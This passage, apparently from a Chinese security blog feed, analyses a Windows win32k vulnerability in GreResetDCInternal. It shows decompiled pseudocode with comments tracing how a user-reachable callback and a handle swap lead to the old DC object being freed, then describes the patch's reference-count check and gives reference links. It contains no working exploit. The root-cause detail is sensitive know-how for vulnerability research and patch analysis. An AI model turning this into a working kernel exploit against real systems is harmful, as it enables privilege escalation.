&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> __usercall GreResetDCInternal&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rax&lt;span style="color:#f92672">&amp;gt;&lt;/span>(HDC a1&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rcx&lt;span style="color:#f92672">&amp;gt;&lt;/span>, &lt;span style="color:#66d9ef">__int64&lt;/span> a2&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rdx&lt;span style="color:#f92672">&amp;gt;&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a3&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>r8&lt;span style="color:#f92672">&amp;gt;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v24; &lt;span style="color:#75715e">// [rsp+50h] [rbp-20h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v25; &lt;span style="color:#75715e">// [rsp+60h] [rbp-10h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v25, a1); &lt;span style="color:#75715e">// 利用构造函数从HDC创建DCOBJ对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v8 &lt;span style="color:#f92672">=&lt;/span> v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">··········&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>); &lt;span style="color:#75715e">// 赋值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1736&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (HDC)&lt;span style="color:#a6e22e">hdcOpenDCW&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>qword_1C0141EB0, v26, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>));&lt;span style="color:#75715e">// 创建新的DC对象，返回对应的HDC句柄
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v24, v13);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> (_QWORD &lt;span style="color:#f92672">*&lt;/span>)v24;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v24 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v12 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">116&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">308&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">309&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(_QWORD, _QWORD))(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2768&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v15 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">v15&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v14[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>i64));&lt;span style="color:#75715e">// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HmgSwapLockedHandleContents&lt;/span>(v3, &lt;span style="color:#ae81ff">0&lt;/span>i64, v6, &lt;span style="color:#ae81ff">0&lt;/span>i64, v23);&lt;span style="color:#75715e">// 交换旧的和新的HDC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">GreReleaseHmgrSemaphore&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">bDeleteDCInternal&lt;/span>(v6, &lt;span style="color:#ae81ff">1&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64); &lt;span style="color:#75715e">// 删除了hdcOpenDCW分配的HDC，但前面经过HmgSwapLockedHandleContents交换了句柄，实际删除的是旧的HDC
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">······&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在补丁中，增加了对DC对象引用次数进行判断的逻辑，如果在GreResetDCInternal函数中DC对象引用次数大于1则表明已经发生异常，进入异常逻辑抛出错误(因为按正常流程此处DC对象引用次数应为不应该大于1)。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_1C014CB0C&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, &lt;span style="color:#66d9ef">__int64&lt;/span> a2, &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v30; &lt;span style="color:#75715e">// [rsp+30h] [rbp-1h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)v30;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v30 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_6:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">EngSetLastError&lt;/span>(&lt;span style="color:#ae81ff">6&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_7:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)v30;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v30 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>stru_1C032C3F8.Length &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">5u&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)&lt;span style="color:#a6e22e">sub_1C00B5068&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>stru_1C032C3F8, &lt;span style="color:#ae81ff">0x400000000000&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v31 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v26;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v28;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x1000000&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">SysEntryGetDispatchTableValues&lt;/span>(v10, (&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>unk_1C02F466B, v11, v12);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考链接：&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.secrss.com/articles/35266" target="_blank">https://www.secrss.com/articles/35266&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ" target="_blank">https://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://bbs.pediy.com/thread-269930.htm" target="_blank">https://bbs.pediy.com/thread-269930.htm&lt;/a>&lt;/p>
&lt;/blockquote></description></item></channel></rss>